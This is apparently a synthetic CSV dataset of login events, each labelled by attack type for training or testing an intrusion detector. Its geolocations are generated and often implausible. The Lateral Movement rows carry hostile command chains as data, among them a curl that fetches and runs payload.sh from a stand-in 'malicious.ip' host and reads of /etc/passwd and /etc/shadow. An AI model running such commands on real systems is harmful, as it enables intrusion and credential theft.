entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,login_success,label
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:01:31,180.64.164.53,"East Megan, Oman",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:01:34,180.64.164.53,"Nortonchester, Tonga",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:01:35,180.64.164.53,"Greentown, Zimbabwe",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:01:39,180.64.164.53,"Aguirreville, Swaziland",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:02:09,180.64.164.53,"North Darlene, Korea",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:02:11,180.64.164.53,"Port Beth, Hungary",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:02:19,180.64.164.53,"East Carloston, Fiji",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:02:29,180.64.164.53,"Garrettshire, Mauritania",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:02:34,180.64.164.53,"Gloriamouth, Holy See (Vatican City State)",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:05:42,213.124.227.74,"Lake Erinshire, Macao",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:05:45,213.124.227.74,"Donaldville, Thailand",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:05:48,213.124.227.74,"South Deborahtown, Antarctica (the territory South of 60 deg S)",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:05:49,213.124.227.74,"Melissamouth, Benin",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:05:51,213.124.227.74,"Josephfort, Isle of Man",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:05:54,213.124.227.74,"New Marioton, Saint Vincent and the Grenadines",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:05:54,213.124.227.74,"Perkinsbury, Botswana",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:05:54,213.124.227.74,"South Cristina, Norway",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:05:55,213.124.227.74,"Port Ambermouth, Sweden",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:05:58,213.124.227.74,"South Christopher, Guyana",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:06:02,213.124.227.74,"Grantville, Jersey",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:06:12,213.124.227.74,"Christinaport, Timor-Leste",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:06:14,213.124.227.74,"Port Christine, Papua New Guinea",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:06:15,213.124.227.74,"South Bridgetberg, Honduras",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:06:18,213.124.227.74,"Port Johnland, Angola",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:06:37,51.58.207.229,"Meyerchester, Moldova",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:06:38,213.124.227.74,"Lake Brandonland, Belgium",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:06:41,51.58.207.229,"Lake Colleenhaven, Morocco",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:06:42,213.124.227.74,"Brookechester, Argentina",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:06:42,51.58.207.229,"Savannahstad, Swaziland",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:06:42,51.58.207.229,"Jessicahaven, New Caledonia",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:06:43,51.58.207.229,"Montgomerystad, Tajikistan",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:06:46,51.58.207.229,"Alexandermouth, Lesotho",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
37553c82-8860-41a2-96a9-277ae9208308,User,2026-06-26 15:06:50,213.124.227.74,"Lowemouth, Paraguay",Confluence,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:06:50,51.58.207.229,"New Wendymouth, Japan",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:06:55,51.58.207.229,"Brandyfort, Korea",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:06:57,51.58.207.229,"Smithmouth, Germany",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:06:59,51.58.207.229,"Fergusonstad, Antigua and Barbuda",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:07:11,51.58.207.229,"West Elizabethstad, Bahamas",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:07:12,51.58.207.229,"New Kathleen, Korea",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:07:13,51.58.207.229,"West Jessica, Kyrgyz Republic",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:07:15,51.58.207.229,"Carrollmouth, Georgia",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:07:17,51.58.207.229,"South Shelly, British Virgin Islands",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:07:19,51.58.207.229,"New Trevor, Greece",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:07:22,51.58.207.229,"Henryberg, Denmark",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:07:25,51.58.207.229,"East Courtneyberg, Kuwait",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:07:27,51.58.207.229,"Grimesmouth, Algeria",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b6fdbe33-7383-4835-9eea-ef9a6e25050c,User,2026-06-26 15:07:57,51.58.207.229,"Brianhaven, United Kingdom",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:12,49.127.215.12,"Port Brittanyville, Bhutan",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:14,49.127.215.12,"Cantuland, Mozambique",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:16,49.127.215.12,"Sanchezburgh, Antarctica (the territory South of 60 deg S)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:19,49.127.215.12,"Jennifertown, Guinea-Bissau",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:24,49.127.215.12,"Clarkbury, Haiti",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:27,49.127.215.12,"Port Michael, Congo",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:28,49.127.215.12,"Francisburgh, Suriname",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:30,49.127.215.12,"South Williamview, Falkland Islands (Malvinas)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:32,49.127.215.12,"Meadowsville, Greenland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:32,49.127.215.12,"Rayhaven, Sierra Leone",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:44,49.127.215.12,"Lindachester, Nicaragua",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:54,49.127.215.12,"Branchborough, Lesotho",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:56,49.127.215.12,"East Luke, Georgia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:13:57,49.127.215.12,"West Kaitlynstad, Germany",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:14:00,49.127.215.12,"East Kevin, Uganda",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:14:12,49.127.215.12,"Cruzchester, Togo",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0c8df462-26ff-498f-a7ee-c99442f415a1,User,2026-06-26 15:14:17,49.127.215.12,"Lake Lauren, Guadeloupe",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:55:59,20.216.22.134,"Lake Wayne, Albania",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:02,20.216.22.134,"Timothyhaven, Thailand",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:03,20.216.22.134,"New Christopher, Falkland Islands (Malvinas)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:03,20.216.22.134,"Hamiltonburgh, Papua New Guinea",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:07,20.216.22.134,"East Joel, Guinea",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:11,20.216.22.134,"North Briannaland, Bosnia and Herzegovina",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:12,20.216.22.134,"Williamsbury, Estonia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:19,20.216.22.134,"Johnsonville, United Arab Emirates",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:22,20.216.22.134,"New Jenniferburgh, China",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:23,20.216.22.134,"New Kristenstad, Madagascar",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:23,20.216.22.134,"South Haroldton, Slovakia (Slovak Republic)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:26,20.216.22.134,"Grahamville, Northern Mariana Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:27,20.216.22.134,"Juanchester, Albania",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:27,20.216.22.134,"Rodriguezmouth, El Salvador",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:27,20.216.22.134,"Johnburgh, France",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:29,20.216.22.134,"New Beckyside, Paraguay",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:35,20.216.22.134,"Danielfort, Egypt",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:35,20.216.22.134,"Lake Sophia, Svalbard & Jan Mayen Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:37,20.216.22.134,"Rebeccaview, Saint Martin",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:47,20.216.22.134,"Jenningsville, Malta",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:49,20.216.22.134,"South Toniside, Saint Martin",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:51,20.216.22.134,"North Jimmouth, Nepal",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:56:54,20.216.22.134,"Lake Jamesborough, Italy",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:03,20.216.22.134,"Macdonaldstad, Rwanda",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:05,20.216.22.134,"Mendozamouth, Uganda",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:07,20.216.22.134,"East Sean, Benin",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:11,20.216.22.134,"Kyleburgh, Portugal",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:13,20.216.22.134,"Johnfort, Guyana",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:17,20.216.22.134,"Delgadoview, Croatia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:19,20.216.22.134,"Reyesville, New Caledonia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:23,20.216.22.134,"Alexanderland, Gabon",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:23,20.216.22.134,"South Jenniferburgh, Martinique",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:29,20.216.22.134,"West Brian, Bulgaria",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
afd00162-bf37-4511-a52e-251da88a8977,User,2026-06-26 16:57:29,51.105.221.127,"Blackchester, Saint Pierre and Miquelon",HRIS,Hardware Token,411,N/A,BlackArch - Brave - MAC: f2:12:bb:41:4f:02,True,Device Spoofing
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:41,20.216.22.134,"Port Michael, Swaziland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:49,20.216.22.134,"Oneillborough, Burundi",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:57:55,20.216.22.134,"Rushport, British Indian Ocean Territory (Chagos Archipelago)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:58:04,20.216.22.134,"Port Diana, Iran",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:58:07,20.216.22.134,"South Coryborough, Monaco",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:58:19,20.216.22.134,"Jenniferview, Sierra Leone",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:58:34,20.216.22.134,"Anthonyhaven, Slovenia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:58:39,20.216.22.134,"Port Brendaberg, Niue",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:58:43,20.216.22.134,"Charlesfurt, Sao Tome and Principe",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a28569b9-c532-4a09-9f42-212e1c69b692,Device,2026-06-26 16:59:09,20.216.22.134,"West Kyle, Switzerland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0b5f2273-58bd-4e9f-ac7f-c2760f7295c7,User,2026-06-26 17:01:24,66.231.243.160,"Port Kevin, Central African Republic",VPN,MFA,2804,N/A,Unknown Browser/Device,True,Impossible Travel
1dc2ad68-ad57-44cb-9a77-bd2e6e3335ed,User,2026-06-26 17:06:18,18.113.91.219,"Foxshire, Hungary",Confluence,Biometric,3128,N/A,Unknown Browser/Device,True,Impossible Travel
e73a2c46-f9a3-46d1-982f-8ecf8e5502d7,User,2026-06-26 17:26:09,39.60.156.139,"Edwardburgh, Somalia",Intranet,SSO,1794,N/A,Unknown Browser/Device,True,Impossible Travel
5b49be46-937b-462a-9970-0e634f48a680,User,2026-06-26 17:48:04,192.148.107.47,"North Amandaborough, North Macedonia",Database,Password,502,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,macOS 13 - Firefox,True,Lateral Movement
5b49be46-937b-462a-9970-0e634f48a680,User,2026-06-26 17:53:04,192.148.107.47,"North Amandaborough, North Macedonia",Backup Server,Password,6957,"arp -a -> wmic process call create ""cmd.exe /c set""",macOS 13 - Firefox,True,Lateral Movement
5b49be46-937b-462a-9970-0e634f48a680,User,2026-06-26 17:54:04,192.148.107.47,"North Amandaborough, North Macedonia",GitLab,Password,4303,cat /etc/passwd -> cat /etc/shadow -> su root,macOS 13 - Firefox,True,Lateral Movement
5b49be46-937b-462a-9970-0e634f48a680,User,2026-06-26 18:08:04,192.148.107.47,"North Amandaborough, North Macedonia",Email,Password,6395,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,macOS 13 - Firefox,True,Lateral Movement
5b49be46-937b-462a-9970-0e634f48a680,User,2026-06-26 18:08:04,192.148.107.47,"North Amandaborough, North Macedonia",Database,Password,1005,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,macOS 13 - Firefox,True,Lateral Movement
1433fbcf-22a3-41df-a332-d557b5f6e3b7,User,2026-06-26 18:11:57,200.4.56.43,"Thompsonburgh, Ghana",Jira,Biometric,229,N/A,BlackArch - Wget - MAC: 34:75:30:e1:b6:96,True,Device Spoofing
e5087288-c620-483d-9dbf-8212393afa32,User,2026-06-26 19:37:08,149.162.192.164,"Port Angelaland, New Zealand",AWS Console,Hardware Token,579,N/A,Unknown Browser/Device,True,Impossible Travel
1df0190e-cc18-4d5c-9679-03ab9e266f01,User,2026-06-26 20:05:09,36.133.218.30,"Jermainemouth, Djibouti",VPN,SSO,2026,cat /etc/passwd -> cat /etc/shadow -> su root,Windows 11 - Edge,True,Lateral Movement
1df0190e-cc18-4d5c-9679-03ab9e266f01,User,2026-06-26 20:11:09,36.133.218.30,"Jermainemouth, Djibouti",Backup Server,SSO,1491,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,Windows 11 - Edge,True,Lateral Movement
1df0190e-cc18-4d5c-9679-03ab9e266f01,User,2026-06-26 20:15:09,36.133.218.30,"Jermainemouth, Djibouti",GitLab,SSO,899,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,Windows 11 - Edge,True,Lateral Movement
1df0190e-cc18-4d5c-9679-03ab9e266f01,User,2026-06-26 20:25:09,36.133.218.30,"Jermainemouth, Djibouti",VPN,SSO,580,curl http://malicious.ip/payload.sh -> chmod +x payload.sh -> ./payload.sh,Windows 11 - Edge,True,Lateral Movement
1df0190e-cc18-4d5c-9679-03ab9e266f01,User,2026-06-26 20:29:09,36.133.218.30,"Jermainemouth, Djibouti",CRM,SSO,6910,"arp -a -> wmic process call create ""cmd.exe /c set""",Windows 11 - Edge,True,Lateral Movement
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:00:31,36.176.181.100,"East Maxberg, Paraguay",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:00:34,36.176.181.100,"Johnside, South Georgia and the South Sandwich Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:00:36,36.176.181.100,"Lake Brentburgh, Algeria",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:00:37,36.176.181.100,"Josephland, Comoros",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:00:40,36.176.181.100,"New Bradley, Portugal",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:00:41,36.176.181.100,"Lake Ashleyville, Finland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:00:45,36.176.181.100,"New Mollychester, Switzerland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:00:47,36.176.181.100,"South Scottville, Monaco",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:00:59,36.176.181.100,"Catherinebury, Antarctica (the territory South of 60 deg S)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:01:01,36.176.181.100,"Millsmouth, Spain",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:01:01,36.176.181.100,"Jessemouth, Venezuela",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:01:03,36.176.181.100,"South Rachelmouth, Mayotte",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:01:09,36.176.181.100,"Gonzalezbury, Ecuador",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:01:16,36.176.181.100,"North Barbarastad, Zambia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:01:19,36.176.181.100,"Lisaland, Oman",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f2a349c6-eb7e-4e3d-9fc2-e8a6af0eee4c,User,2026-06-27 07:01:22,36.176.181.100,"South Leonardburgh, Cook Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
